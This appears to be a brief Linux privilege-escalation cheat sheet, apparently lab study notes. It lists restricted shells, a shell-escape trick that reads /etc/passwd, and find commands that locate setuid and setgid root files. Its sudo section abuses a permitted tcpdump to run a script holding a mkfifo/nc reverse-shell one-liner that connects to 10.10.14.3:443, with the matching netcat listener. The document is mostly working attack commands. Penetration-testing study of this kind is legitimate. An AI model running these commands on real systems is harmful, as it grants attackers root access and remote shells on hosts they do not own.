# Shells
`rbash` -- [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
`rksh` -- [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command)
`rzsh` -- [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

### That one Queen song (I want to break free)
```bash
ls -l `pwd`

# Doing echo commands can help such as
echo $(</etc/passwd)

# Try things with '|' or other methods as well.
```

# Special Permissions
```bash
# Finding files with permissions
# Setuid
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Setgid
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

# Sudo Rights Abuse
```bash
sudo -l
(root) NOPASSWD: /usr/sbin/tcpdump

cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

nc -lnvp 443
```